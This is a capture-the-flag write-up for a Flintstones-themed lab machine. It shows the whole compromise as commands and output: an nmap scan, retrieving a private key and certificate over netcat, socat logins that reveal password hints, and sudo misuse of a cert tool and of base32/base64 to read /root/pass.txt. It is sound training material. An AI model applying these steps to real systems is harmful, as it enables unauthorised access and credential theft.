## Description
```
Fred Flintstone   &   Barney Rubble!

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
Can you find all the Easter eggs?
```

When I entered the IP address in the search bar, I got redirected to the same IP at port 4040
```
Welcome to ABC!
Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

nmap scan
```
└─$ sudo nmap -sV 10.10.81.116
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 19:08 PDT
Nmap scan report for 10.10.81.116
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
9009/tcp open  pichat?
```

I connected to port 9009 using netcat
```
What are you looking for? Barney
Sorry, unrecognized request: 'Barney'

You use this service to recover your client certificate and private key
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxrFXY1kV7yvM3qd4fw//NKUOAWZ4I5yMsw9WglBtdr/Ihlv/
1xA5MbB05Io+S11vOdjlIK3fr9HZo6VCFLbhanVfoul2vRFRPFqjSOqoe6KlXxNv
pYWX61dABtNMh+GEkctvGpyDLHWZb8if2NpE/bDSMt5ooPkETkXFbnITP/ymnmsH
TOJJ1OdNhzj0Y00PIwkxAVyXiiPUEdlBDgAGbPD9CtgETFonQ8dJjOkeFscxd4C2
l1Iex5JkMTp8zV6QdjzoFZqw3PjsddobsFcTV4Ugs7ie2btjAz9dsVCsIHwcWwDi
37SukPCbDN7MQpn8AIt0hVKEvUakMvYBrADLZQIDAQABAoIBACtSJTyLAuZHxX5S
Q0po4XrH9frGLbGOA3tS/8if4o3+mKj6zBhG+EFmOMZPge+KqqKRMLvkTR4Xgf1V
HchIa3N7reNmRbZJXU3scSeHyj5Sov3Mzg3nx8zPFC2oykniGLZ1BX9m2o7KAS9H
LdrpFBu//sSKi4N1Z8PtIHPJOXs8p3d4LciCyQ4JNKZ6CIbSXiLndWR5FDpOG0QK
Mio12XPo6U6l9p2PDz5HKKXY4JtKou8KYcKFafZEFchqagTqZIE5Vb98/Y0hfvo+
xbliMB/j72s2NDv6jXGLrfIMuB2/o7I7xvFsoOurld9FgQpeY0akf7bTxWrsELZZ
rhCkEQ0CgYEA5Quk4dgbSsBwiQRcadrgOQjPcaa9dUwZT6CqU0NMPKe6BLj1lGTb
EIgtFFSd/+Qam4PaOIMiErJjE9njvzYPmNCtm9Ov6bixWSrEKapLtCjHCwf1MMr0
OEfpXUj2Ton92qQAqbKfNixUF//JtAAgsgXB1YsJrIAL6GSAsb4KHfsCgYEA3hNF
5mFBuluabQQF0buzyLJNhXN6/CDeOBT/crho8RBv3fAKgp31I9vu7vQmYdz6aIXb
L8nHqR8FETuDDoLb7Aaz2MZfttF0IVXEoDLxdNLVPo1nGfUSkToNgVE2MMEDDyP+
GynUsr1bigp1vs7WR10GPfB+aKWLgUSSE+M/Xh8CgYEAmGtzQcdqAgil2shIJzk8
VTgDtAHduhz2CwND1TzHkuWa6GGdKy8iiJHWTd0xd4P4IN1RbqH1HrQPMrqg0DHN
l0fm//eS7Nm3SzsmZwOodS9dpX2aMOoeMwXHyggvwHwbrk/NESCIyqgdHgtd0qbz
GwSxxMVNnrlnMzMOYTmxydkCgYB62FR5bWFrklKpbWk+rMN2CNQDN29X22KxyUPJ
lSNP/pSzQ568xF4fuQDCJEK7Lf9DJJCsLcWJ00P9VVtZAqBfPxHrn0jBG7pO2mAL
ckLJKfuWP6hB3qSnu2JPH7qHW62yiWl+YzRqr37crI6Xv1kfXuEeEFQM1U6HcoQQ
Bkw+ZwKBgQCdtTE2GsIIL3ao00SFYIazC5oYhthmJZJBEZRJcIJg18YQYkR3QSVY
lV4nFMG2hoByyMosrZUh5QTIkiFRy2xRiuqA9Yz/IemtG6UjVi4HyqARVM/A4+4S
wLOzHwwWeeovsWabmARWmV7Uq0gYMnJzI6n1k58dRp9atlFu90HItw==
-----END RSA PRIVATE KEY-----

What are you looking for? client
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDIwMjA3MjBaFw0yMzA5MDIwMjA3MjBaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGsVdj
WRXvK8zep3h/D/80pQ4BZngjnIyzD1aCUG12v8iGW//XEDkxsHTkij5LXW852OUg
rd+v0dmjpUIUtuFqdV+i6Xa9EVE8WqNI6qh7oqVfE2+lhZfrV0AG00yH4YSRy28a
nIMsdZlvyJ/Y2kT9sNIy3mig+QRORcVuchM//KaeawdM4knU502HOPRjTQ8jCTEB
XJeKI9QR2UEOAAZs8P0K2ARMWidDx0mM6R4WxzF3gLaXUh7HkmQxOnzNXpB2POgV
mrDc+Ox12huwVxNXhSCzuJ7Zu2MDP12xUKwgfBxbAOLftK6Q8JsM3sxCmfwAi3SF
UoS9RqQy9gGsAMtlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAEzB7RLEE18owjle
qQ7FIkwV720UOp4JZVS2cuzMITzpxqROztV7bakBNHySyE0+TMLa/PD1SpHkeeA9
VfOYyT7jH1HRN5NHMt7qWdA3N7ljk4+GFgNuUuIXZOtIdzkLQuUqXgPsEPHYUyyE
WijrrWc62NCljuiTfY0BRTLWwslA0LBwshCVWYNeaipr6VWtXzE8PWTRwZPx8PH5
SpUJIdxFdbwLPjFkIrT4xNkCbhriJm2UMAHBoQDyKMq8rTQfyXg7UORCLCtz1Oab
vyrk5fl4rfxp7BO26oDrdCvosEqaC1bbFbIv9qbgu2EBk1VCEllUkzaR+jxtayhs
C0NsHlI=
-----END CERTIFICATE-----

What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0

```

I plugged in the parameters and connected using the suggested method.
```
Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints

b3dr0ck> hint
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')


```

```
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
    
    ...
    barney@b3dr0ck:/home/fred$ cat /usr/bin/certutil
#!/usr/bin/env node


require('../dist/certs');
```

```
barney@b3dr0ck:/home/fred$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

barney@b3dr0ck:/home/fred$ sudo /usr/bin/certutil -ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  4 19:38 barney.certificate.pem
-rw-r----- 1 root root 1674 Sep  4 19:38 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  4 19:38 barney.csr.pem
-rw-r----- 1 root root 1678 Sep  4 19:38 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  4 19:38 fred.certificate.pem
-rw-r----- 1 root root 1674 Sep  4 19:38 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  4 19:38 fred.csr.pem
-rw-r----- 1 root root 1678 Sep  4 19:38 fred.serviceKey.pem


barney@b3dr0ck:/home/fred$ sudo /usr/bin/certutil fred 'Fred Flintstone'
Generating credentials for user: fred (Fred Flintstone)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvEBN/2H3Xaeok2YcfSKu+PeOJO9Nm12SDyIax7gUtndHW3Nl
hGpISwrxj6hH8NM6mdKhHwMGxs4WDJxKRfOtsxu57N7jDzPLsCtDm0USNFDzoxI6
dy5Z4nFmWExp6spNcxjEiHr/3U+pbvrI0+h8rPo7yyKyyT8V/+52Fs80K7bGEvRl
T8TjWnvhQ6Jf+941ttAK+XQeETMrHc6h+sbfRG5PEuLxBzFxwObZc3iPYACGvywh
2IaVVfQwe8ztvxzVousRuAzwbc85SFCHsLZx1HOpjls4O/9+0do6VvDwjnphz4O2
OAic4Hkv8UpCYNRLxQP7aRtIr4Bff6uuL1m4TQIDAQABAoIBAClwFjsy+1p4P1lC
zt6UteNDytxCeNjMPgxqu25fDOAlXWW5/wyowIUUQZwXtM5EENAvVxwWdHVqg9v+
wzKmswOMBN8pKN39zsZWn6kcCSfO8fJhXtFBOLPptleVanMuWOIO/6PzP0Md9/Pf
7DkJIfiJlIPgfW5jHpqZiRD4R0mfrr/5Edr8ZMnrLUCA6CaM+T3JIjM6B2unRJsW
sh3lenKH9ClsolP1EMKKZayM8Di5kar/kylOjHpoiylzwnwZb/p+hbSH21RYbhTc
fhkdzBqapstpG5A1vPKXXDPEE6C+lomebDy6+KtHlHdq4O2zAfMENdo6qup8D7J7
NAdw1FkCgYEA9JaO1crGLzG+5Ez3XhECStl+yN6CVOBn63tMJliEDA2TVVYrNoq0
ucpQZ18nBHiWvLf3QKAFHrT5ewxyHKJc5iPFIDwwH90unpBcJ5IvfQmplxjuyYEQ
E5VM5N/W+1+8ZiKZthrKvmO4yl43jKnNT8go30oCpAywyat3WY0mWA8CgYEAxQjW
9XxLi/osjXR7gh9LpfZL+GIQuRVGnMIS8oUPCXHxCffC6aTaDGeJWHANmSRbFrcU
i1DSkLK0+cGSd/XRJcOsYadY7k2frIxBIGIs/8mRuOmf16e2FGIPpPtNXDMjpLe4
z9NKnwYrjM90qP+t8UTUbApcKb56FUToy7IxLeMCgYEAiRQgdV2x+R1OOTGRqdyq
hjyjO/zI2rzyQR3XLd6KEx9ApaEnkufmJgJnUagYe/8BrD8GieelNvKCqB3vjnDI
1ArUHh7dcd5KlH+fxmW9y7wwmghVPAXjdrZEZDm3iSa8thlKQK9/VXkaRgDL7T/1
W3N4xLv8AulB46T/vObIyK0CgYAEcMePbsaxF+lLItXpv9TPn7Zkmakw0qbtv333
00Hcf6HkDJ5q75kucGLrCFN2IRigcW3YGfE066IigtdPNs4I4NkQtlnNvRgdJmgN
V8kV1rAfD7zXemMjIHajzDoZGtnxy2Yx4Nwsq1Ht8Xr6mBCOgHOdH7qmAjH0KsJo
XNK46wKBgHIVBpg6eqhcOg/bIizvJmwpupiWdnp6fLUB70Hv+mvRcyM+B77YxVfu
TzNGsqm3yE4jplI8BJOM74b51Et2oe+M7wDrw8ECspLOexxO5x04QjQvbPI00Viz
nhas9ORBmFAYsjN33qXclfKdVgkkymzHeEifR/aZpReDV8mz/5g1
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICozCCAYsCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDQyMDIyNTRaFw0yMjA5MDUyMDIyNTRaMBoxGDAWBgNVBAMMD0Zy
ZWQgRmxpbnRzdG9uZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALxA
Tf9h912nqJNmHH0irvj3jiTvTZtdkg8iGse4FLZ3R1tzZYRqSEsK8Y+oR/DTOpnS
oR8DBsbOFgycSkXzrbMbueze4w8zy7ArQ5tFEjRQ86MSOncuWeJxZlhMaerKTXMY
xIh6/91PqW76yNPofKz6O8sissk/Ff/udhbPNCu2xhL0ZU/E41p74UOiX/veNbbQ
Cvl0HhEzKx3OofrG30RuTxLi8QcxccDm2XN4j2AAhr8sIdiGlVX0MHvM7b8c1aLr
EbgM8G3POUhQh7C2cdRzqY5bODv/ftHaOlbw8I56Yc+DtjgInOB5L/FKQmDUS8UD
+2kbSK+AX3+rri9ZuE0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAgxLRDVDwIdp/
CsxRtf09ZMClE/psuitc8ikPaK8DzU3BiyMcezafZa70hqh2YUrCufVz7QQCuhyE
l8UDJJXlFMAwEzEzn5kSk++BlVybSwZujb3kxpYeEFIXV6BjE4iOa5HZlR8rcN6F
UouJs6oX2srbyTcrhNEyFtFOkx23hPsXLykSr/dll8lXRLQrnkrmXMRtNvxeFa/w
pzaXKFSaGhtN+tSctVe6C6/eOo52K9E4H5BsIkmU0j9yyqPG5AOFux9o6ucr1pR9
1K+2FC6BQnDEdlqPR4BsOrg18buRj5O0mgdIbAkNbmErZQn47yCkb7mX4yDaq1Of
UAaqT1oBqw==
-----END CERTIFICATE-----

```

`socat stdio ssl:10.10.183.102:54321,cert=/home/gomez22/bedrock/fred_cert,key=/home/gomez22/bedrock/fred_key,verify=0
`
```
Welcome: 'Fred Flintstone' is authorized.
b3dr0ck> help
Password hint: YabbaDabbaD0000! (user = 'Fred Flintstone')
b3dr0ck> 

```

```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt

```

```
fred@b3dr0ck:~$ sudo /usr/bin/base32 /root/pass.txt
JRDEWRKDGUZFUS2SINMFGV2LLBEVUVSVGQZUWSSHJZGVQVKSJJJUYRSXKZJTKMSPKBFECWCVKRGE
4SSKKZKTEUSDK5HEER2YKVJFITCKLJFUMU2TLFFQU===
fred@b3dr0ck:~$ 

```
```
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```

LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK

from base32 from base 64
`flintstonesvitamins` - md5
